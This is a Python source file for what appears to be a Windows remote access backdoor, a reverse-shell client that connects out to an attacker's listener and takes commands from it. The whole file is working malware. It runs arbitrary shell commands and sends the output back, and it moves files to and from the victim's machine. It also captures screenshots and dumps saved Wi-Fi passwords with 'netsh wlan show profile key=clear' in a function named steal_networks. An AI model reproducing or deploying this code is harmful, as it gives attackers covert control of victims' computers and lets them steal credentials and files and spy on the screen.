import subprocess
import os
import re
import socket
from mss import mss

def cd_into(cwd: str, command: str) -> str:
    if len(command.split(" ", 1)) == 2:
        target_dir: str = command.split(" ", 1)[-1]
        return f"{cwd}\{target_dir.strip()}"
    else:
        return f"{cwd}"

def cd_back(cwd: str) -> str:
    current_path: str = os.path.normpath(cwd)
    current_path_split: list[str] = current_path.split(os.sep)
    current_path_split.pop()
    return f"{os.sep}".join(current_path_split)


def steal_networks(cwd: str) -> None:
    try:
        show_networks_command: str = "netsh wlan show profile"
        name_password_pairs: str = ""
        command_results = subprocess.run(show_networks_command, shell=True, text=True, capture_output=True)
        network_names: list[str] = re.findall('(?:Profile\s*:\s)(.*)', command_results.stdout)
        for network_name in network_names:
            find_password_command = subprocess.run(f"{show_networks_command} {network_name} key=clear", shell=True, text=True, capture_output=True)
            password: list[str] = re.findall('(?:Key Content\s*:\s)(.*)', find_password_command.stdout)
            password: str = "".join(password)
            name_password_pair: str = f"{network_name} : {password}"
            name_password_pairs += f"{name_password_pair}\n"
        file = open(fr"{cwd}\networks_passwords.txt", "w")
        file.write(name_password_pairs)
        file.close()
        new_socket.send("success".encode(FORMAT))
    except BaseException:
        new_socket.send("failed".encode(FORMAT))


BUFSIZ = 1024
PORT = 0
LISTENER_IP = ""
FORMAT = "utf-8"
ADDRESS = (LISTENER_IP, PORT)

# INITIALIZING SOCKET
new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
new_socket.connect(ADDRESS)


def main():
    cwd = os.getcwd()
    while True:
        command = new_socket.recv(BUFSIZ).decode(FORMAT)
        if command == "steal networks":
            steal_networks(cwd)

        elif command.split(" ", 1)[0] == "download":
            filename: str = command.split(" ", 1)[1].strip()
            try:
                target_file = open(f"{cwd}{os.sep}{filename}", "rb")
                new_socket.send("File found".encode(FORMAT))
                file_bytes: bytes = target_file.read()
                file_header: str = str(len(file_bytes)).encode(FORMAT)
                new_socket.send(filename.encode(FORMAT))
                if new_socket.recv(BUFSIZ).decode() == "filename received":
                    new_socket.send(file_header)
                    if new_socket.recv(BUFSIZ).decode() == "file header received":
                        new_socket.send(file_bytes)
                target_file.close()
            except BaseException:
                new_socket.send("File not found".encode(FORMAT))

        elif command.split(" ", 1)[0] == "upload":
            try:
                filename = new_socket.recv(BUFSIZ).decode(FORMAT)
                new_socket.send("filename received".encode(FORMAT))
                file_header = new_socket.recv(BUFSIZ).decode(FORMAT)
                new_socket.send("file header received".encode(FORMAT))
                file_bytes = new_socket.recv(int(file_header))
                new_file = open(fr"{cwd}{os.sep}{filename}", "wb")
                new_file.write(file_bytes)
                new_file.close()
                new_socket.send("success".encode(FORMAT))
            except BaseException:
                new_socket.send("failed".encode(FORMAT))

        elif command == "snapshot":
            try:
                with mss() as sct:
                    sct.shot(output="snapshot.png")
                subprocess.run(fr'move "{os.getcwd()}{os.sep}snapshot.png" "{cwd}{os.sep}snapshot.png"', shell=True)
                new_socket.send("success".encode(FORMAT))
            except BaseException:
                new_socket.send("failed".encode(FORMAT))
       
        elif command == "cd ..":
            cwd = cd_back(cwd)
            new_socket.send(cwd.encode(FORMAT))

        elif "cd" in command:
            cwd = cd_into(cwd, command)
            new_socket.send(cwd.encode(FORMAT))

        elif command == "exit":
           new_socket.close() 
           break

        else:
            try:
                command_results = subprocess.run(command, text=True, capture_output=True, shell=True, cwd=cwd)
                if command_results.stdout:
                    new_socket.send(command_results.stdout.encode(FORMAT))

                else:
                    new_socket.send("Command executed.".encode(FORMAT))
            except BaseException:
                new_socket.send("Command failed".encode(FORMAT))
if __name__ == "__main__":
    main()
